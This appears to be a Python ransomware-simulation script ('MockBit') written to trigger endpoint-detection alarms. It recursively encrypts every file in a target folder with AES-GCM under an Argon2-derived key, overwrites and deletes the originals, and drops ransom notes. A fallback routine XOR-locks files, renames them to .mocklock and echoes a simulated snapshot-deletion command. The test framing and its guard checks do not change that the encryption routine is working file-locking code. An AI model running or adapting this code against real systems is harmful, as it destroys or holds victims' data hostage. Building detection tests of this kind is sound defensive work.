import os
import shutil
import json
import base64
import getpass
import argparse
import sys
from pathlib import Path
import importlib.util
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from argon2.low_level import hash_secret_raw, Type
from concurrent.futures import ThreadPoolExecutor
import tempfile
import subprocess

try:
    from mockbit.ransom_sim import run_simulation as _ransom_sim
except Exception:  # pragma: no cover - optional module for binaries
    try:
        mod_path = Path(__file__).with_name("mockbit") / "ransom_sim.py"
        spec = importlib.util.spec_from_file_location("mockbit.ransom_sim", mod_path)
        if spec and spec.loader:
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            _ransom_sim = mod.run_simulation
        else:
            _ransom_sim = None
    except Exception:
        _ransom_sim = None

if _ransom_sim is None:
    def _ransom_sim(target_dir: Path, threads: int = 8) -> None:
        """Fallback ransomware simulation if module import fails."""
        NOTE_TEXT = (
            "Your files have been encrypted by MockBit-Test.\n"
            "This is ONLY a test. No real ransom. Key = AA.\n"
        )
        _KEY = 0xAA

        def _xor_bytes(data: bytes) -> bytes:
            return bytes(b ^ _KEY for b in data)

        def _process_file(file_path: Path) -> None:
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                enc = _xor_bytes(data)
                tmp_fd, tmp_name = tempfile.mkstemp(dir=str(file_path.parent))
                with os.fdopen(tmp_fd, "wb") as tmp:
                    tmp.write(enc)
                    tmp.flush()
                    os.fsync(tmp.fileno())
                out = file_path.with_suffix(file_path.suffix + ".mocklock")
                os.replace(tmp_name, out)
                os.unlink(file_path)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=threads) as exe:
            for dirpath, _, files in os.walk(target_dir):
                root = Path(dirpath)
                for name in files:
                    fp = root / name
                    if not fp.is_file() or fp.is_symlink():
                        continue
                    exe.submit(_process_file, fp)
                note = root / "README_MOCKBIT_RESTORE.txt"
                try:
                    with open(note, "w") as f:
                        f.write(NOTE_TEXT)
                except Exception:
                    pass
        subprocess.run(["/bin/echo", "simulate rm -rf /home/*/.snapshots"])

# Default options
START_PATH = "folder"
KEY_FILENAME = "MOCKBIT_KEY.txt"
NONCE_SIZE = 12  # Bytes for AES-GCM nonce
SALT_SIZE = 16  # Bytes for Argon2 salt
ARGON2_TIME = 2         # Number of iterations
ARGON2_MEMORY = 102400  # Memory cost in kibibytes
ARGON2_PARALLELISM = 8  # Degree of parallelism


def parse_args():
    parser = argparse.ArgumentParser(
        description="Encrypt all files in a folder recursively"
    )
    parser.add_argument(
        "--path",
        default=START_PATH,
        help="Target directory (default: %(default)s)",
    )
    parser.add_argument(
        "--time",
        type=int,
        default=ARGON2_TIME,
        help="Argon2 time cost (iterations)",
    )
    parser.add_argument(
        "--memory",
        type=int,
        default=ARGON2_MEMORY,
        help="Argon2 memory cost in KiB",
    )
    parser.add_argument(
        "--parallelism",
        type=int,
        default=ARGON2_PARALLELISM,
        help="Argon2 degree of parallelism",
    )
    parser.add_argument(
        "--ransom-sim",
        action="store_true",
        help="Run ransomware simulation instead of encryption",
    )
    parser.add_argument(
        "--sim-path",
        default=os.path.join(os.getcwd(), "testdata"),
        help="Directory for ransomware simulation",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="Force simulation on large directories",
    )
    parser.add_argument(
        "--ransom-note",
        action="store_true",
        help="Write a simple ransom note for easier EDR detection",
    )
    return parser.parse_args()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct_bytes, tag = cipher.encrypt_and_digest(data)
    with open(file_path + ".mock", "wb") as f:
        f.write(nonce + tag + ct_bytes)
    secure_delete(file_path)


def secure_delete(path):
    """Overwrite the file with random bytes before removing it."""
    try:
        length = os.path.getsize(path)
        with open(path, "wb") as f:
            f.write(get_random_bytes(length))
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print("Sicheres Löschen fehlgeschlagen für", path, e)
    finally:
        try:
            os.remove(path)
        except Exception:
            pass
def find_and_encrypt_all_files(path, key):
    for dirpath, _, files in os.walk(path):
        for name in files:
            file_path = os.path.join(dirpath, name)
            if name.endswith(".mock") or name == KEY_FILENAME:
                continue
            try:
                encrypt_file(file_path, key)
                print("Verschlüsselt:", file_path)
            except Exception as e:
                print("Fehler bei", file_path, e)


def write_ransom_note(path):
    """Write a simple ransom note to help EDR solutions flag the activity."""
    note_path = os.path.join(path, "RANSOM_NOTE.txt")
    note = (
        "Your files have been encrypted as part of a simulation.\n"
        "Use decrypt_all.py with the original passphrase to restore them.\n"
    )
    try:
        with open(note_path, "w") as f:
            f.write(note)
        print("Ransom Note erstellt:", note_path)
    except Exception as e:
        print("Konnte Ransom Note nicht erstellen:", e)

if __name__ == "__main__":
    args = parse_args()

    if args.ransom_sim:
        sim_dir = Path(args.sim_path)
        if str(sim_dir) in ["/", "/home", "/var", "/etc"]:
            print("Refusing to run ransomware simulation on system directories.")
            sys.exit(1)
        if shutil.disk_usage(sim_dir).free < 10 * 1024 * 1024:
            print("Not enough free space for simulation.")
            sys.exit(1)
        file_count = sum(len(files) for _, _, files in os.walk(sim_dir))
        if file_count > 10000 and not args.force:
            print(f"{file_count} files detected. Re-run with --force to continue.")
            sys.exit(1)

        if _ransom_sim is None:
            print("Ransom simulation module unavailable.")
            sys.exit(1)

        print("\033[91m⚠️  Ransom-Sim mode active – EDR alarms expected.\033[0m")
        _ransom_sim(sim_dir)
        sys.exit(0)

    passphrase = getpass.getpass(
        "Bitte Passphrase zum Verschlüsseln eingeben:\n"
    )
    salt = get_random_bytes(SALT_SIZE)
    key = hash_secret_raw(
        secret=passphrase.encode(),
        salt=salt,
        time_cost=args.time,
        memory_cost=args.memory,
        parallelism=args.parallelism,
        hash_len=32,
        type=Type.ID,
    )

    key_path = os.path.join(args.path, KEY_FILENAME)
    key_info = {
        "salt": base64.b64encode(salt).decode(),
        "time": args.time,
        "memory": args.memory,
        "parallelism": args.parallelism,
    }
    with open(key_path, "w") as f:
        json.dump(key_info, f)
    print(f"Parameter wurden in {key_path} gespeichert. Passphrase merken!")
    print(f"Starte Verschlüsselung in: {args.path}")
    find_and_encrypt_all_files(args.path, key)
    if args.ransom_note:
        write_ransom_note(args.path)
    print("Fertig.")
